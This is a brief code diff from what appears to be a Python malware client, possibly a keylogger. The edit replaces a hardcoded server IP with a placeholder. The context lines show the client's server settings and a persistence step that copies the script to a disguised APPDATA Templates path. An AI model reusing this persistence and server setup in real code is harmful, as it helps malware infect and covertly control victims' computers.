@@ -42,7 +42,7 @@ PumpMessages()
 
 class WebClient:
     def __init__(self):
-        self.SERVER_IP = '192.168.0.123'
+        self.SERVER_IP = '<SERVER-IP-ADDRESS>'
         self.SERVER_PORT = 5000
         # Persistence I: copy script to random appdata location
         self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
